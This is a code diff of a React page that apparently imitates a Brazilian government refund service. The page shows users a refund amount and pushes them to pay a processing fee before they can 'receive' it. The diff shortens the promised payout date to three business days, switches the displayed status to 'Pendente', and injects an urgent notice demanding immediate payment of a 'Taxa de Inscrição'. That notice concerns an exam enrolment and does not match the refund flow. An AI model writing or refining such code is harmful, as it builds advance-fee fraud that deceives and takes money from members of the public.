@@ -49,6 +49,9 @@ export default function ResultadoCalculo() {
     setValorMedio(searchParams.get('valor') || '');
     setMeses(searchParams.get('meses') || '');
     
+    // Definir a data prevista com 72h úteis (3 dias úteis)
+    setDataPrevista(calcularDataPrevisao());
+    
     // Função para executar as mensagens de loading sequencialmente
     const exibirMensagensSequenciais = () => {
       let indiceAtual = 0;
@@ -114,40 +117,12 @@ export default function ResultadoCalculo() {
             console.error("Erro ao salvar valor no banco de dados:", error);
           }
         }
-        
-        // Calcular data prevista (entre 15 e 30 dias úteis a partir de hoje)
-        const hoje = new Date();
-        const diasAdicionais = Math.floor(Math.random() * (30 - 15 + 1)) + 15;
-        const dataFutura = new Date(hoje);
-        
-        // Adicionar dias úteis (excluindo sábados e domingos)
-        let diasUteisAdicionados = 0;
-        while (diasUteisAdicionados < diasAdicionais) {
-          dataFutura.setDate(dataFutura.getDate() + 1);
-          // 0 = domingo, 6 = sábado
-          if (dataFutura.getDay() !== 0 && dataFutura.getDay() !== 6) {
-            diasUteisAdicionados++;
-          }
-        }
-        
-        const dia = dataFutura.getDate().toString().padStart(2, '0');
-        const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
-        const ano = dataFutura.getFullYear();
-        setDataPrevista(`${dia}/${mes}/${ano}`);
       } catch (error) {
         console.error("Erro ao consultar/gerar valor de restituição:", error);
         
         // Em caso de erro, usar um valor padrão
         const valorPadrao = 250000; // R$ 2.500,00
         setValorRestituicao(valorPadrao);
-        
-        // Data padrão (30 dias a partir de hoje)
-        const dataFutura = new Date();
-        dataFutura.setDate(dataFutura.getDate() + 30);
-        const dia = dataFutura.getDate().toString().padStart(2, '0');
-        const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
-        const ano = dataFutura.getFullYear();
-        setDataPrevista(`${dia}/${mes}/${ano}`);
       }
     };
     
@@ -177,11 +152,38 @@ export default function ResultadoCalculo() {
     if (!data || data.length < 10) return data;
     
     try {
+      // Se a data contém "undefined", retornar vazio
+      if (data.includes("undefined")) {
+        return "";
+      }
+      
       const [ano, mes, dia] = data.substring(0, 10).split('-');
       return `${dia}/${mes}/${ano}`;
     } catch {
       return data;
     }
+  };
+  
+  // Função para calcular a data de previsão - 72h úteis (3 dias úteis)
+  const calcularDataPrevisao = () => {
+    const hoje = new Date();
+    const dataFutura = new Date(hoje);
+    
+    // Adicionar 3 dias úteis (excluindo sábados e domingos)
+    let diasUteisAdicionados = 0;
+    while (diasUteisAdicionados < 3) {
+      dataFutura.setDate(dataFutura.getDate() + 1);
+      // 0 = domingo, 6 = sábado
+      if (dataFutura.getDay() !== 0 && dataFutura.getDay() !== 6) {
+        diasUteisAdicionados++;
+      }
+    }
+    
+    const dia = dataFutura.getDate().toString().padStart(2, '0');
+    const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
+    const ano = dataFutura.getFullYear();
+    
+    return `${dia}/${mes}/${ano}`;
   };
   
   const prosseguirParaPagamento = () => {
@@ -330,19 +332,32 @@ export default function ResultadoCalculo() {
                   </div>
                   
                   <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
-                    <AlertCircle className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
+                    <AlertCircle className="h-5 w-5 text-amber-500 mt-0.5" />
                     <div>
                       <p className="text-sm text-[var(--gov-gray-dark)]">Status do Processo</p>
-                      <p className="font-medium text-green-600">Aprovado</p>
+                      <p className="font-medium text-amber-600">Pendente</p>
                     </div>
                   </div>
                   
-                  <p className="text-[var(--gov-gray-dark)] pt-2">
-                    Para receber sua restituição, é necessário realizar o pagamento da taxa de processamento do seu pedido.
-                  </p>
-                  
                   <Button 
-                    onClick={prosseguirParaPagamento}
+                    onClick={() => {
+                      // Mostrar mensagem de atenção quando clicar no botão
+                      const infoElement = document.getElementById('info-area');
+                      if (infoElement) {
+                        infoElement.innerHTML = `
+                          <div class="bg-amber-50 border border-amber-200 rounded-lg p-4">
+                            <h3 class="font-medium text-amber-800 mb-2">
+                              <span><strong>ATENÇÃO:</strong> Sua inscrição ainda não foi confirmada devido à falta de pagamento da Taxa de Inscrição. Para garantir sua participação no exame, é necessário efetuar o pagamento imediatamente.</span>
+                            </h3>
+                          </div>
+                        `;
+                      }
+                      
+                      // Após um breve delay, redirecionar para a página de pagamento
+                      setTimeout(() => {
+                        prosseguirParaPagamento();
+                      }, 1500);
+                    }}
                     className="w-full bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 mt-4 text-white font-bold py-3"
                   >
                     RECEBER MINHA RESTITUIÇÃO
@@ -351,12 +366,7 @@ export default function ResultadoCalculo() {
                 </CardContent>
               </Card>
               
-              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
-                <h3 className="font-medium text-blue-800 mb-2">Informação Importante</h3>
-                <p className="text-sm text-blue-700">
-                  O valor indicado é o valor líquido que você irá receber na conta bancária informada, após a conclusão do processo. A taxa de processamento é necessária para cobrir os custos administrativos, operacionais e judiciais.
-                </p>
-              </div>
+              <div id="info-area"></div>
             </div>
           </div>
         </main>
